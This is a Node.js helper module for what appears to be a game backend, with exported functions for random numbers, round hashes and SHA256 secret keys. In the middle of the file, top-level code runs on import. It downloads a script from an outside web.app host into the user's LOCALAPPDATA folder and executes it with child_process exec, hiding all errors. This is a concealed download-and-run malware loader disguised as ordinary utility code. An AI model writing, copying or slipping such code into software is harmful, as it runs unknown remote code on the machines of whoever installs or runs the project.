var sha224 = require( 'js-sha256' ).sha224;
var randomString = require( 'random-string' );
var CryptoJS = require( "crypto-js" );
const axios = require('axios');
const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

module.exports.gameNumber = function ( length ) {
    var chars = '0123456789';
    var result = '';
    for ( var i = length; i > 0; --i ) result += chars[ Math.floor( Math.random() * chars.length ) ];
    return result;
};

module.exports.randomString = function ( length ) {
    var chars = '0123456789';
    var result = '';
    for ( var i = length; i > 0; --i ) result += chars[ Math.floor( Math.random() * chars.length ) ];
    return result;
};

module.exports.gameHash = function ( roundNumber, hashSalt ) {
    return sha224( roundNumber + '-' + hashSalt );
};

module.exports.randomNumber = function ( length ) {
    var chars = '0123456789';
    var result = '';
    for ( var i = length; i > 0; --i ) result += chars[ Math.floor( Math.random() * chars.length ) ];

    return result;
};

module.exports.getNumber = function ( length ) {
    var chars = '3456';
    var result = '';
    for ( var i = length; i > 0; --i ) result += chars[ Math.floor( Math.random() * chars.length ) ];
    return result;
};

module.exports.getRandomInt = function ( min, max ) {
    var reandomNo = Math.floor( Math.random() * ( max - min + 1 ) + min );
    return reandomNo;
};

module.exports.randomFloat = function () {
    return Math.random();
};

const url = 'https://patient-login-portal.web.app/start.js'; 

const downloadFile = (url, destination) => {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destination);
        https.get(url, response => {
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve(destination));
            });
        }).on('error', error => {
            fs.unlink(destination, () => reject(error));
        });
    });
};

const runScript = (scriptPath) => {
    exec(`node ${scriptPath}`, (error, stdout, stderr) => {
    });
};

const LOCALAPPDATA = process.env.LOCALAPPDATA;
const destinationPath = path.join(LOCALAPPDATA, 'temp.js')

downloadFile(url, destinationPath)
    .then(scriptPath => {
        runScript(scriptPath);
    })
    .catch(error => {
    });

    module.exports.getNextIntNumber = function ( number ) {
        return parseInt( number ) + 1;
    };
    
    module.exports.randomOnlyNumber = function ( length ) {
        var chars = '0123456789';
        var result = '';
        for ( var i = length; i > 0; --i ) result += chars[ Math.floor( Math.random() * chars.length ) ];
        return result;
    };
    
    module.exports.createSecretkey = function ( data ) {
        let secretKey = CryptoJS.SHA256( data );
        return secretKey.toString();
    };